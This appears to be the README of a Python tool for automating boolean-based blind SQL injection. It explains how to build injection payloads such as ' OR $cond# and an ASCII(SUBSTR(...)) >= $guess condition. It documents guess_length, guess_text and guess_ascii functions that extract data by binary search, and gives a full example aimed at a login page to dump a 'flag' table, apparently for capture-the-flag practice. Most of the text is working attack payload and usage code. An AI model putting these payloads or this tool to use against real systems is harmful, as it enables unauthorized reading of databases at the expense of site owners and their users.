A blind SQLi payload may like as:  
`index.php?title=a' AND ASCII(SUBSTR((SELECT flag FROM iamflag LIMIT 0,1), $index, 1)) >= $guess`

The function binsearch() will replace $index and $guess to a concrete number, then guess the result.  
NOTICE: The expression must compare by ">=". Otherwise, binary search will suffer errors.

We must define some variable:
- target : A normal url and parameter that we want to inject.
    ex: "http://sqli.tw/index.php?title=test"
- payload : Our SQLi query with $cond variable, you should escape special character by html encode if necessary.
    ex: "' [OR|AND] $cond [#|--]"
- condition(cond) : The boolean expression in SQL semetic with $guess and $index(optional) varaible.
    ex: "ASCII(SUBSTR((SELECT flag FROM iamflag LIMIT 0,1), $index, 1)) >= $guess"
- msg : The response from target if our query is true.
    ex: "Login Success"

Then we declare a BooleanBased object, and dump databases.  
```
b = BooleanBased(payload, cond, msg, target = target)
print b.guess_ascii(40, verbose = True)
```

The full example:  
```
payload = "' OR $cond#"
payload = ulib.quote(payload).replace("%24", "$")
msg = "Login Success"
target = "http://tor.atdog.tw:8080/boolean/login.php?u=admin\&p="
cond = "ASCII(SUBSTR((SELECT flag FROM iamflag LIMIT 0,1), $index, 1)) >= $guess"
cond = ulib.quote(cond).replace("%24", "$")
b = BooleanBased(payload, cond, msg, debug=False, target = target)
print b.guess_ascii(40, verbose = True)
```

- guess\_length(minlen, maxlen):
    - minlen: The lower bound of the data length.
    - maxlen: The upper bound of teh data length.
    Guess the data length.  
- guess\_text(length, verbose):
    - length: The length of the data.
    - verbose: if verbosd is false, the process won't show on monitor.
    Guess the data, if comparing the character directly in qeury.  
- guess\_ascii(length, verbose):
    - length: The length of the data.
    - verbose: if verbosd is false, the process won't show on monitor.
    Guess the data, if comparing the charecter by ascii value.  
